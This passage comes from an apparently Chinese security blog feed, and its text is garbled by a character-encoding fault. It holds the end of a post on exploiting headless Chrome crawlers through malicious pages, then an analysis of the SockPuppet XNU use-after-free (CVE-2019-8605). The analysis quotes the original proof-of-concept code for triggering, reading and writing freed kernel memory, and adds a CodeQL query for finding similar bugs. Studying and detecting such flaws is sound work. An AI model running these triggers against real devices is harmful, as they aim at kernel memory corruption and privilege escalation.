16.00.39@2x"></p><p>çœ‹èµ·æ¥ä¸é”™ : )</p><p>åŠ å…¥æ¶æ„çš„JSä¹‹å:</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-05-26%20at%2016.01.20@2x.png" alt="CleanShot 2021-05-26 at 16.01.20@2x"></p><p>è¿™é‡Œæœ‰ä¸ªåœ°æ–¹ä¸å®Œç¾ï¼Œæˆ‘æœ¬æ¥å°è¯•js web workeråŠ è½½expï¼Œæƒ³ çˆ¬è™«æ­£å¸¸å·¥ä½œï¼Œçˆ¬å–åˆ°éœ€è¦çš„å†…å®¹ï¼Œexpåœ¨åå°è·‘ï¼Œä½†æ˜¯æˆ‘å‘ç°è¦ä¹ˆæ—¶é—´ä¸å¤Ÿæˆ‘è·‘expï¼ˆéœ€è¦çˆ¬è™«åœç•™çš„ä¹…ä¸€ç‚¹ï¼‰ï¼Œè¦ä¹ˆå°±expè·‘äº†ï¼Œä½†æ˜¯å†…å®¹æ²¡çˆ¬å–åˆ°ã€‚è¿™ç‚¹æˆ‘è®¤ä¸ºåº”è¯¥å¯ä»¥è§£å†³ï¼Œå¦‚æœæœ‰çŸ¥é“çš„å‰ç«¯å¤§ä½¬å¯ä»¥åˆ†äº«ä¸€ä¸‹~</p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>é‚£ä¹ˆæ˜¯å¦å­˜åœ¨è¿™æ ·ä¸€æ¡æ”»å‡»é“¾ï¼Œé’ˆå¯¹çˆ¬è™«æˆ–è€…ä¸€äº›Headless Chromeçš„æœåŠ¡ï¼š</p><ul><li>æ¶æ„æ„é€ é¡µé¢ï¼Œé›†æˆå¤šä¸ªExploitï¼Œè¦†ç›–å¤§é‡Chromeç‰ˆæœ¬ï¼Œæ‰“è¿›å»å°±æŒ–çŸ¿orç§å‹’ç´¢ï¼Ÿ</li></ul><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/7Zi44n1rRIcwwOnyt7QVgWLR5LnI7TEiIQ_fB6TInGCS5fFhcz8eGCVHFUNHbDtw_9sukk5r206zbiXjPJfnjoKjo8eh9aiWQQ7sqhNIzBuaZaUkBhq0IfF4Yfxp4rLkhesfMg.jpeg" alt="img"></p><p>æœ€åè¿˜æ˜¯å»ºè®®<strong>ä»¥å®˜æ–¹æ–‡æ¡£ä¸ºå‡†</strong>ï¼Œå†™ä»£ç å‚è€ƒæ–‡æ¡£è€Œä¸æ˜¯ä»ç½‘ä¸Šçš„æŠ€æœ¯æ–‡ç« é‡Œæ‘˜ : )</p><h2 id="Demo-amp-Exp"><a href="#Demo-amp-Exp" class="headerlink" title="Demo &amp; Exp"></a>Demo &amp; Exp</h2><p><a href="https://github.com/o0xmuhe/headless_chrome_demo">https://github.com/o0xmuhe/headless_chrome_demo</a></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><p><a href="https://developers.google.com/web/updates/2017/04/headless-chrome">https://developers.google.com/web/updates/2017/04/headless-chrome</a></p></li><li><p><a href="https://www.anquanke.com/post/id/103350">https://www.anquanke.com/post/id/103350</a> </p></li><li><p><a href="https://xz.aliyun.com/t/2120">https://xz.aliyun.com/t/2120</a></p></li><li><p><a href="https://wangxin1248.github.io/python/2018/09/python3-spider-8.html">https://wangxin1248.github.io/python/2018/09/python3-spider-8.html</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/29207391">https://zhuanlan.zhihu.com/p/29207391</a></p></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯&quot;&gt;&lt;/a&gt;èƒŒæ™¯&lt;/h2&gt;&lt;p&gt;Chrome M59å¼•å…¥äº† Headless Chromeï¼Œè‡³æ­¤å¯ä»¥åœ¨æ— GUIçš„ç¯å¢ƒä¸‹ä½¿ç”¨Chromeï¼Œæå¤§çš„æ–¹ä¾¿äº†è‡ªåŠ¨åŒ–æµ‹è¯•å·¥ä½œï¼Œä¹Ÿå¯ä»¥ç”¨äºé¢„è§ˆæœåŠ¡ï¼Œæˆ–è€…ç½‘ç»œçˆ¬è™«ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="exploit" scheme="https://o0xmuhe.github.io/categories/exploit/"/>
    
    
    <category term="exploit" scheme="https://o0xmuhe.github.io/tags/exploit/"/>
    
    <category term="Chrome" scheme="https://o0xmuhe.github.io/tags/Chrome/"/>
    
  </entry>
  
  <entry>
    <title>SockPuppetå­¦ä¹ è®°å½•(ä¸€) : æ¼æ´åˆ†æ</title>
    <link href="https://o0xmuhe.github.io/2021/02/28/SockPuppet%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%80-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://o0xmuhe.github.io/2021/02/28/SockPuppet%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%80-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2021-02-27T16:01:01.000Z</published>
    <updated>2021-08-01T14:35:13.331Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h1><p>  è¿™ä¸ªæ¼æ´æ˜¯ç”±pj0çš„ <code>nedwill</code> å‘ç°çš„ï¼Œè€Œä¸”æ˜¯ä¸€ä¸ªå“ç›¸æä½³çš„å¯ä»¥ç”¨äºè¶Šç‹±çš„æ¼æ´ï¼Œæœ¬æ–‡åªæ˜¯å¯¹æ¼æ´è¿›è¡Œåˆ†æï¼Œå¹¶ä¸”æ€è€ƒ/å°è¯•ä½¿ç”¨CodeQLå¯¹è¯¥ç±»å‹æ¼æ´è¦†ç›–ã€‚å½“ç„¶ï¼Œåœ¨çœ‹äº†åŸä½œè€…çš„<a href="https://googleprojectzero.blogspot.com/2019/12/sockpuppet-walkthrough-of-kernel.html">æ–‡ç« </a>ä¹‹åï¼Œæ‰å‘ç°nedwillæ˜¯åˆ©ç”¨Fuzzingçš„æ‰‹æ®µå‘ç°çš„è¿™ä¸ªæ¼æ´ï¼Œå¹¶ä¸”åœ¨æŒ–æ˜è¯»/å†™åŸè¯­çš„æ—¶å€™ä¹Ÿæ˜¯å€ŸåŠ©äº†Fuzzingçš„æ‰‹æ®µï¼Œå¯ä»¥è¯´ååˆ†çš„å·§å¦™å’Œé«˜æ•ˆäº†ã€‚</p><span id="more"></span><ul><li><p>æ¼æ´issue ï¼š<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1806&sort=-id&colspec=ID%20Type%20Status%20Priority%20Milestone%20Owner%20Summary&q=owner:nedwill@google.com&can=1">1806 - project-zero - Project Zero - Monorail</a></p></li><li><p>ç³»ç»Ÿç‰ˆæœ¬ï¼š10.14.3</p></li><li><p>xnuä»£ç ï¼š</p></li></ul><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/sockpuppet1/xnu.png" alt="Issue%201806%20XNU%20Use-after-free%20due%20to%20stale%20pointer%20a2555a06c23846e09d40b51e696047aa/Untitled.png"></p><h1 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h1><h2 id="raw-poc"><a href="#raw-poc" class="headerlink" title="raw poc"></a>raw poc</h2><p>åœ¨æµ‹è¯•åŸå§‹PoCè·å¾—çš„Crashä¿¡æ¯å¦‚ä¸‹ï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/sockpuppet1/crash.png" alt="Issue%201806%20XNU%20Use-after-free%20due%20to%20stale%20pointer%20a2555a06c23846e09d40b51e696047aa/Untitled%201.png"></p><p>åŸå§‹PoCä½¿ç”¨äº†<code>raw socket</code>è§¦å‘ï¼Œä½†æ˜¯ç¾ä¸­ä¸è¶³ï¼Œè¿™ä¸ªæ–¹å¼å¿…é¡»è¦rootæƒé™æ‰èƒ½è§¦å‘ã€‚<br>(å®šåˆ¶åŒ–<code>sockaddr_in6</code> éœ€è¦<code>raw socket</code>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IPPROTO_IP 0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IN6_ADDR_ANY &#123; 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 &#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IN6_ADDR_LOOPBACK &#123; 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1 &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s = socket(AF_INET6, SOCK_RAW, IPPROTO_IP);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res0: %d\n&quot;</span>, s);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in6</span> <span class="title">sa1</span> =</span> &#123;</span><br><span class="line">        .sin6_len = <span class="keyword">sizeof</span>(struct sockaddr_in6),</span><br><span class="line">        .sin6_family = AF_INET6,</span><br><span class="line">        .sin6_port = <span class="number">65000</span>,</span><br><span class="line">        .sin6_flowinfo = <span class="number">3</span>,</span><br><span class="line">        .sin6_addr = IN6_ADDR_LOOPBACK,</span><br><span class="line">        .sin6_scope_id = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in6</span> <span class="title">sa2</span> =</span> &#123;</span><br><span class="line">        .sin6_len = <span class="keyword">sizeof</span>(struct sockaddr_in6),</span><br><span class="line">        .sin6_family = AF_INET6,</span><br><span class="line">        .sin6_port = <span class="number">65001</span>,</span><br><span class="line">        .sin6_flowinfo = <span class="number">3</span>,</span><br><span class="line">        .sin6_addr = IN6_ADDR_ANY,</span><br><span class="line">        .sin6_scope_id = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> res = connect(s, (<span class="keyword">const</span> sockaddr*)&amp;sa1, <span class="keyword">sizeof</span>(sa1));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res1: %d\n&quot;</span>, res);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buffer[<span class="number">4</span>] = &#123;&#125;;</span><br><span class="line">    res = setsockopt(s, <span class="number">41</span>, <span class="number">50</span>, buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res1.5: %d\n&quot;</span>, res);</span><br><span class="line"></span><br><span class="line">    res = connect(s, (<span class="keyword">const</span> sockaddr*)&amp;sa2, <span class="keyword">sizeof</span>(sa2));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res2: %d\n&quot;</span>, res);</span><br><span class="line"></span><br><span class="line">    close(s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;done\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="read"><a href="#read" class="headerlink" title="read"></a>read</h2><p>åç»­nedç»è¿‡ç ”ç©¶å‘ç°å¯ä»¥é€šè¿‡tcp socketæ–¹å¼è§¦å‘ï¼Œå¯ä»¥ç”¨äºread freeâ€™d memroy:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">TCP-based reproducer for CVE-2019-8605</span></span><br><span class="line"><span class="comment">This has the benefit of being reachable from the app sandbox on iOS 12.2.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IPV6_3542PKTINFO 46</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res0: %d\n&quot;</span>, s);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buffer[<span class="number">1</span>] = &#123;<span class="string">&#x27;\xaa&#x27;</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> res = setsockopt(s, IPPROTO_IPV6, IPV6_3542PKTINFO, buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res1: %d\n&quot;</span>, res);</span><br><span class="line"></span><br><span class="line">    res = disconnectx(s, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res2: %d\n&quot;</span>, res);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">socklen_t</span> buffer_len = <span class="keyword">sizeof</span>(buffer);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//get sth from ...</span></span><br><span class="line">    res = getsockopt(s, IPPROTO_IPV6, IPV6_3542PKTINFO, buffer, &amp;buffer_len);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res3: %d\n&quot;</span>, res);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;got %d\n&quot;</span>, buffer[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    close(s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;done\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="write"><a href="#write" class="headerlink" title="write"></a>write</h2><p>ç»è¿‡nedwillçš„Fuzzingæµ‹è¯•ï¼Œå‘ç°äº†write freeâ€™d memory çš„PoCï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  setoptshut.m</span></span><br><span class="line"><span class="comment">//  ExploitDev</span></span><br><span class="line"><span class="comment">//  TCP-based reproducer for CVE-2019-8605, using SONPX_SETOPTSHUT to do a</span></span><br><span class="line"><span class="comment">//  write to the freed memory. Tested on iOS 12.2.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  Created by Ned Williamson on 6/17/19.</span></span><br><span class="line"><span class="comment">//  Copyright Â© 2019 Ned Williamson. All rights reserved.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#import <span class="meta-string">&lt;UIKit/UIKit.h&gt;</span></span></span><br><span class="line"><span class="meta">#import <span class="meta-string">&quot;AppDelegate.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IPV6_USE_MIN_MTU 42</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> s = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res0: %d\n&quot;</span>, s);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Permit setsockopt after disconnecting (and freeing socket options)</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">so_np_extensions</span> <span class="title">sonpx</span> =</span> &#123;.npx_flags = SONPX_SETOPTSHUT, .npx_mask = SONPX_SETOPTSHUT&#125;;</span><br><span class="line">    <span class="keyword">int</span> res = setsockopt(s, SOL_SOCKET, SO_NP_EXTENSIONS, &amp;sonpx, <span class="keyword">sizeof</span>(sonpx));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res1: %d\n&quot;</span>, res);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> minmtu = <span class="number">-1</span>;</span><br><span class="line">    res = setsockopt(s, IPPROTO_IPV6, IPV6_USE_MIN_MTU, &amp;minmtu, <span class="keyword">sizeof</span>(minmtu));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res2: %d\n&quot;</span>, res);</span><br><span class="line">    </span><br><span class="line">    res = disconnectx(s, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res3: %d\n&quot;</span>, res);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// set, write sth...</span></span><br><span class="line">    res = setsockopt(s, IPPROTO_IPV6, IPV6_USE_MIN_MTU, &amp;minmtu, <span class="keyword">sizeof</span>(minmtu));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res4: %d\n&quot;</span>, res);</span><br><span class="line">    </span><br><span class="line">    close(s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;done\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    @autoreleasepool &#123;</span><br><span class="line">        <span class="keyword">return</span> UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="bug-analysis"><a href="#bug-analysis" class="headerlink" title="bug analysis"></a>bug analysis</h1><p>æ ¹æ®æ¼æ´æè¿°ï¼Œå¯ä»¥çœ‹åˆ°æ¼æ´çš„ root causeå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">in6_pcbdetach</span><span class="params">(struct inpcb *inp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> (!(so-&gt;so_flags &amp; SOF_PCBCLEARING)) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ip_moptions</span> *<span class="title">imo</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ip6_moptions</span> *<span class="title">im6o</span>;</span></span><br><span class="line"></span><br><span class="line">        inp-&gt;inp_vflag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (inp-&gt;in6p_options != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            m_freem(inp-&gt;in6p_options);</span><br><span class="line">            inp-&gt;in6p_options = <span class="literal">NULL</span>; <span class="comment">// &lt;- good</span></span><br><span class="line">        &#125;</span><br><span class="line">        ip6_freepcbopts(inp-&gt;in6p_outputopts); <span class="comment">// &lt;- bad</span></span><br><span class="line">        ROUTE_RELEASE(&amp;inp-&gt;in6p_route);</span><br><span class="line">        <span class="comment">// free IPv4 related resources in case of mapped addr</span></span><br><span class="line">        <span class="keyword">if</span> (inp-&gt;inp_options != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            (<span class="keyword">void</span>) m_free(inp-&gt;inp_options); <span class="comment">// &lt;- good</span></span><br><span class="line">            inp-&gt;inp_options = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>æ¼æ´è·¯å¾„ <code>bsd/netinet6/in6_pcb.c</code> ï¼Œåè®®æ— <code>AF_INET6</code> çš„å¤„ç†å‡½æ•°ï¼Œä»å‡½æ•°åå­—æ¥çœ‹æ˜¯<br>æ–­å¼€è¿æ¥æ—¶å€™ä¼šæ‰§è¡Œçš„ä¸€äº›æ“ä½œï¼ˆé‡Šæ”¾ä¸€äº›èµ„æºï¼‰ï¼Œä½†æ˜¯é‡Šæ”¾ä¹‹åå¿˜è®°æŠŠæŒ‡é’ˆç½®NULLï¼Œå¯¼è‡´åŒä¸€ä¸ªå¥—æ¥å­—é‡è¿çš„æ—¶å€™åˆä½¿ç”¨åˆ°äº†è¿™ä¸ªæŒ‡é’ˆï¼ˆæ‚¬å‚æŒ‡é’ˆï¼‰ã€‚<br>æ ¹æ®<code>nedwill</code>çš„æè¿°ï¼Œè¿æ¥æ–­å¼€å†<code>set/get socketopt</code>çš„åœºæ™¯å¯ä»¥è§¦å‘ã€‚</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/sockpuppet1/vuln_code.png" alt="Issue%201806%20XNU%20Use-after-free%20due%20to%20stale%20pointer%20a2555a06c23846e09d40b51e696047aa/Untitled%202.png"></p><p>è¿›å…¥å‡½æ•°ä¹‹å‰æœ‰ä¸€ä¸ª socket <code>so_flags</code> çš„æ£€æŸ¥ï¼Œpocä¸­çš„ <code>setsockopt()</code> è°ƒç”¨åº”è¯¥æ˜¯ä¸ºäº†èƒ½è¿‡è¿›å…¥æ¼æ´é€»è¾‘è®¾è®¡çš„ã€‚</p><p>åˆ©ç”¨ <code>socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);</code> è¿™ä¸ªpocï¼Œé€»è¾‘åº”è¯¥æ˜¯ï¼š</p><ul><li>åˆ›å»ºsocketè¿æ¥</li><li>setsockoptï¼Œä¸ºäº†åç»­å¯ä»¥è¿›å…¥æ¼æ´ä»£ç åˆ†æ”¯ï¼ŒåŒæ—¶è®¾ç½®è¦è¯»çš„æ•°æ®</li><li>disconnectx æ–­å¼€è¿æ¥ï¼Œè§¦å‘ free é€»è¾‘</li><li>getsockoptï¼Œè¯»å–å·²ç»é‡Šæ”¾çš„å†…å­˜</li></ul><p>å†™çš„é€»è¾‘ç±»ä¼¼ï¼Œä¸è¿‡ä½œè€…æ˜¯æ‰¾åˆ°äº†å¦å¤–ç‰¹æ®Šçš„æˆå‘˜æ¥å®Œæˆå†™æ“ä½œï¼š <code>SONPX_SETOPTSHUT</code>  </p><p>è¿™ä¸ªæ´çš„å“ç›¸å¤ªå¥½äº†  :-)</p><h1 id="how-to-find-by-QL"><a href="#how-to-find-by-QL" class="headerlink" title="how to find by QL"></a>how to find by QL</h1><h2 id="xnu-database"><a href="#xnu-database" class="headerlink" title="xnu database"></a>xnu database</h2><p>å¯ä»¥ä»semmleå®˜æ–¹ç½‘ç«™ä¸‹è½½</p><p><a href="https://semmle.com/large-oss-projects">Analyzing large open source projects</a></p><h2 id="about-this-bug"><a href="#about-this-bug" class="headerlink" title="about this bug"></a>about this bug</h2><p>çœ‹èµ·æ¥æ˜¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">demo</span><span class="params">(p)</span></span>&#123;</span><br><span class="line">  </span><br><span class="line">  ptr, p2; <span class="comment">// ....</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    m_free(p-&gt;p1); <span class="comment">// vuln!</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(xxx)&#123;</span><br><span class="line">        freem(p2);</span><br><span class="line">        p2 = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡Šæ”¾äº†å†…å­˜ä¹‹åï¼Œæ²¡æœ‰å¯¹æŒ‡é’ˆåšç½®NULLå¤„ç†ã€‚</p><ul><li>éœ€è¦åœ¨åŒä¸€ä¸ªå‡½æ•°é‡Œï¼ŒåŒä¸€ä¸ªä»£ç å—é‡Œã€‚ <strong><del>é”çš„é—®é¢˜è€ƒè™‘å—ï¼Ÿ</del></strong></li><li>é‡Šæ”¾é€»è¾‘ï¼Œæ­£åˆ™åŒ¹é…ä¸‹ï¼Œ xxxfree, freexxx, releasexxxä¹‹ç±»çš„</li></ul><h2 id="query-1"><a href="#query-1" class="headerlink" title="query 1"></a>query 1</h2><p>æ ¹æ®ä¸Šé¢çš„æè¿°ï¼Œæˆ‘ä»¬æ‰¾åˆ°free è°ƒç”¨ï¼Œä¸”freeè°ƒç”¨ä¸‹ä¸€è¡Œæ˜¯ç‰¹å®šçš„èµ‹å€¼è¡¨è¾¾å¼çš„æƒ…å†µï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"></span><br><span class="line">from FunctionCall call, AssignExpr e</span><br><span class="line">where call.getTarget().getName().regexpMatch(<span class="string">&quot;.*free.*?&quot;</span>) <span class="keyword">and</span></span><br><span class="line">    call.getEnclosingBlock() = e.getEnclosingBlock() <span class="keyword">and</span></span><br><span class="line">    e.getRValue().(Literal).getValue() = <span class="string">&quot;0&quot;</span> <span class="keyword">and</span></span><br><span class="line">    call.getLocation().getStartLine() + <span class="number">1</span> =  e.getLocation().getStartLine()</span><br><span class="line">select call, call.getEnclosingFunction().getName(), call.getArgument(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/sockpuppet1/query1.png" alt="Issue%201806%20XNU%20Use-after-free%20due%20to%20stale%20pointer%20a2555a06c23846e09d40b51e696047aa/Untitled%203.png"></p><p>è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘å°è¯•è¿‡<code> 